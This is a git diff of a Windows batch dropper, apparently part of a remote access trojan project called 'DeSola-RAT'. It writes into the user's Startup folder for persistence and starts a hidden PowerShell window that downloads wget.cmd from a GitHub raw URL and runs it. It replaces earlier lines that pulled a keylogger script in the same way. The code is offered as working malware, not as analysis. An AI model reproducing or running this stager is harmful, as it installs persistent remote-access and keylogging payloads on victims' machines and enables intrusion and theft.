@@ -11,13 +11,10 @@ cd %STARTUP%
 
 @REM TODO : build out stage two
 @REM write payloads to startup
-(
-    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/PrettyBoyCosmo/DucKey-Logger/refs/heads/main/p.ps1 -Outfile p.ps1"
-) > wget.cmd
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/main/files/wget.cmd -Outfile wget.cmd"
 
 @REM run payload
-powershell ./wget.cmd
-pause
+start ./wget.cmd
 
 @REM cd back into initial location
 cd %INITIALPATH%
